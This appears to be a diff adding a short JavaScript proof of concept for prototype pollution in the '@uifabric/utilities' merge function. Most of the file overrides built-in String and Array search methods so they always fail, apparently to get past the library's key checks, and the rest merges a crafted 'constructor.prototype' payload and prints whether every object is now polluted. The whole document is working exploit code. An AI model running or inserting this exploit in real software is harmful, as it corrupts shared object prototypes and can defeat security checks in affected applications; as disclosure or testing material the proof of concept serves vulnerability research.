@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+const util = require('@uifabric/utilities');
+const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
+const source2 = { k3: {} };
+console.log({}.polluted);
+y = util.merge(source2, JSON.parse(malicious_payload));
+console.log({}.polluted);
